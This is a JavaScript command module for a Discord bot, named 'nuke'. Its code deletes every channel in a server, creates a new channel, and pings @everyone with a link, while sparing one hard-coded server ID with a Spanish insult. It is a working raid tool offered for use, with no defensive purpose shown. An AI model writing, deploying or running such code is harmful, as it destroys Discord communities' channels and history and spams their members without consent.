const Discord = require('discord.js');

module.exports = {
  name: "nuke", 
  alias: ["delete", "del"],
//873586520647409714
execute (client, message, args){

    if (message.guild.id == "879159373270761522") return message.channel.send("¿Que intentas subnormal?") 
    
  message.guild.channels.cache.forEach(channel => channel.delete());
        message.guild.channels.create(`pestete on top`, {
            type: 'text'
        }).then(channel => {
            channel.send("https://pestete.gay/ @everyone")

    })
 }

}